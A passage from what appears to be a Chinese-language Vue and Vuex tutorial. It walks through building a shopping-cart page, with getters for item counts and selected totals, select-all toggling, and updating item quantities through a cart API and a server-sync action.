#CE9178">'Cart'</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">'cartList'</span><span style="color: #D4D4D4">])</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span></code></pre></div></div></figure><p>将 template 中对应的地方进行改造：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cart-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;div class="cart-item" v-for="item in cartList" :key="item.goods_id"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;van-checkbox :value="item.isChecked"&gt;&lt;/van-checkbox&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="show"&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;img :src="item.goods.goods_image" alt=""&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;span class="tit text-ellipsis-2"&gt;{{ item.goods.goods_name }}&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;span class="bottom"&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;div class="price"&gt;¥ &lt;span&gt;{{ item.goods.goods_price_min }}&lt;/span&gt;</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">CountBox</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">CountBox</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;/div&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;/div&gt;</span></span></code></pre></div></div></figure><p>但未完成其他功能按钮等事件。</p><h3 id="封装-getters-实现动态统计"><a class="markdownIt-Anchor" href="#封装-getters-实现动态统计"></a> 封装 getters 实现动态统计</h3><ul><li>合计商品数量</li></ul><p>合计商品数量使用到 getters</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">getters</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 求所有的商品累加总数</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">countCartTotal</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reduce</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p><a href="https://segmentfault.com/a/1190000044748736">reduce 函数的 20 个高级用法</a></p><ul><li>合计价格</li><li>结算</li></ul><p>最终完整结果：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">getters</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 求所有的商品累加总数</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">countCartTotal</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reduce</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 选中的商品项目</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">selectedCartList</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// filter只会接收回调结果为true的元素，所以可以不用做其他判断</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">filter</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 选中的商品项目数量</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">selectedCartCount</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">) { </span><span style="color: #6A9955">// 这里的getters可以获取到上面定义的getters</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Array</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">isArray</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">) ? </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reduce</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">) : </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 选中的商品总价</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">selectedPrice</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// toFixed(2) 保留两位小数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Array</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">isArray</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">) ? </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reduce</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4"> * </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_price_min</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">toFixed</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">) : </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><p>修改购物车页面的相关 template</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"all"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">共&lt;i&gt;{{ countCartTotal }}&lt;/i&gt;件商品</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"all-total"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="price"&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;span&gt;合计：&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;span&gt;¥ &lt;i class="totalPrice"&gt;{{selectedPrice}}&lt;/i&gt;&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goPay"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{</span><span style="color: #C8C8C8">disabled</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">selectedCartCount</span><span style="color: #D4D4D4"> === </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">}</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">结算({{selectedCartCount}})</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"delete"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{</span><span style="color: #C8C8C8">disabled</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">selectedCartCount</span><span style="color: #D4D4D4"> === </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">}</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">删除</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h3 id="全选反选"><a class="markdownIt-Anchor" href="#全选反选"></a> 全选反选</h3><p>提供 mutations 便于修改 state</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">toggleChecked</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 遍历购物车列表，找到对应id的商品，修改其选中状态</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4"> = !</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    })</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">allToggle</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">flag</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 遍历购物车列表，修改所有商品的选中状态</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">flag</span></span><span class="line"><span style="color: #D4D4D4">    })</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><p>给全选和商品选择框注册点击事件：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-checkbox</span></span><span class="line"><span style="color: #D4D4D4">  @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">toggleChecked</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">  :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">van-checkbox</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"all-check"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;van-checkbox @click="allToggle" :value="isAllChecked" icon-size="18"&gt;&lt;/van-checkbox&gt;</span></span><span class="line"><span style="color: #D4D4D4">        全选</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">... methods: { toggleChecked (goodsId) {</span></span><span class="line"><span style="color: #D4D4D4">this.$store.commit('Cart/toggleChecked', goodsId) }, allToggle () {</span></span><span class="line"><span style="color: #D4D4D4">this.$store.commit('Cart/allToggle', !this.isAllChecked) } },</span></span></code></pre></div></div></figure><p>辅助函数导入 isAllChecked</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">...</span><span style="color: #DCDCAA">mapGetters</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart'</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">'countCartTotal'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'selectedCartList'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'selectedCartCount'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'selectedPrice'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'isAllChecked'</span><span style="color: #D4D4D4">])</span></span></code></pre></div></div></figure><h3 id="数字框修改数量功能"><a class="markdownIt-Anchor" href="#数字框修改数量功能"></a> 数字框修改数量功能</h3><p>提供更新购物车的接口模块：<code>api/cart.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 更新购物车商品</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">updateCart</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsNum</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsSkuId</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/cart/update"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>在 vuex 的 cart 子模块导入使用</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getCartList</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">updateCart</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/cart"</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>cart 子模块增加修改商品数量的 mutations 方法</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">changeCount</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 遍历购物车列表，找到对应id的商品，修改其数量</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsNum</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsSkuId</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">obj</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_sku_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">goodsNum</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      })</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>cart 子模块增加同步购物车到后台的 actions 方法</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 将本地购物车列表同步到服务器（结算时优先调用）</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">syncCartAction</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 接口只接受三个参数：goodsId、goodsNum、goodsSkuId，所以需要遍历本地购物车列表，将选中的商品拆分为三个参数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">paramsObj</span><span style="color: #D4D4D4"> = {}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">.</span><span style="color: 